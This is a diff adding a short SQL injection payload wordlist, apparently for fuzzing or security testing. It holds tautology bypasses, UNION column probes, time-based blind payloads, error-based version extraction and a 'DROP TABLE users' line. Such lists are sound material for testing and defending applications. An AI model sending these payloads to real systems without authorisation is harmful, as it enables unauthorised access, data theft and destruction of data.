@@ -1,0 +1,22 @@
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+1' AND '1'='1
+1' AND '1'='2
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+1; DROP TABLE users--
+admin'--
+' OR ''='
+') OR ('1'='1
+1' ORDER BY 1--
+1' ORDER BY 10--
+-1' UNION SELECT 1,2,3,4,5--
+' AND 1=CONVERT(int,@@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
